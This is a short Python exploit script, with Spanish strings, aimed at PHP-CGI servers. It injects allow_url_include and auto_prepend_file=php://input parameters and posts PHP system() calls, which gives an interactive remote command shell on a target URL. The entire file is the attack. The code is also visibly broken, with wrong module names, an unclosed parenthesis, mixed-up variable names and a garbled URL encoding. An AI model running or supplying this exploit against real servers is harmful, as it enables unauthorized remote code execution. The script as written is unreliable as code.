import request
import argparser

parser = argparser.ArgumentParser()
parser.addArgument('-t', '--target', help="Objetivo")
parser= parser.parse_args()

def main():
    if parser.target:
        vuln = "/?-d+allow_url_include½3d1+-d+auto_prepend_file½3dphp://input"
        target = parser.target
        if not target.startswith("http://":
                target = "http://"+target
        try:
           exe = request.post(target+vuln, "<?php system('whoami'); die(); ?>")
           user = exp.text.replace("\n","")
           try:
                while True:
                    comando = input(f"{user}$")
                    exp = request.post(target+vuln,f"<?php system('{comando}'); die();")
                    print(exp.text)

           except KeyboardInterrupt:
                exit()
        except:
            print("Error al conectar")
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()


